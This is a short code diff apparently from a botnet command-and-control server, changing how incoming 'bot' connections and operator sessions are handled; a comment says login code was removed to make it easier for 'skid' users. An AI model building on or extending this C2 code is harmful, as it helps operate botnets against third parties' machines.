@@ -139,7 +139,8 @@ def waitConnect(sock,addr):
 					socketList.append(sock)
 					print("[!] A bot Online "+ str(addr)) #message
 					handle_bot(sock,socketList)
-			else passwd == "\r\n":
+			elif "\n" in passwd :
+				print("Somebody connected:"+str(addr))
 				Commander(sock)
 		except:
 			#removed Login code, more easy for skid
